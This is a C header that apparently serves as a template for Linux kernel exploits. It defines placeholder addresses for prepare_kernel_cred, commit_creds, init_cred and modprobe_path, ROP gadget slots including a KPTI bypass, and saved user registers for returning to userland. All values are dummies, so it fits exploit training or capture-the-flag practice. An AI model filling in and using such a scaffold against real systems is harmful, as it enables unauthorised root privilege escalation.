#ifndef __KPWN_VARS_H
#define __KPWN_VARS_H

#include <sched.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

/* ------------------- uneditable ------------------- */
#define DUMMY_VALUE (0xdddddddddddddddd)
#define default_kbase (0xffffffff81000000)
#define kbase_offset (kbase - default_kbase)
uint64_t user_cs, user_ss, user_rsp, user_rflags;
cpu_set_t t1_cpu, t2_cpu;
uint64_t kbase = default_kbase;

/* -------------------- editable -------------------- */
// addresses
#define addr_prepare_kernel_cred (DUMMY_VALUE + kbase_offset)
#define addr_init_cred (DUMMY_VALUE + kbase_offset)
#define addr_commit_creds (DUMMY_VALUE + kbase_offset)
#define addr_modprobe_path (DUMMY_VALUE + kbase_offset)

// gadgets
#define pop_rdi_ret (DUMMY_VALUE + kbase_offset)
#define pop_rcx_ret (DUMMY_VALUE + kbase_offset)
#define mov_rdi_rax_rep_ret (DUMMY_VALUE + kbase_offset)
#define bypass_kpti (DUMMY_VALUE + kbase_offset)

// config variables
bool kaslr = true;

#endif  // __KPWN_VARS_H
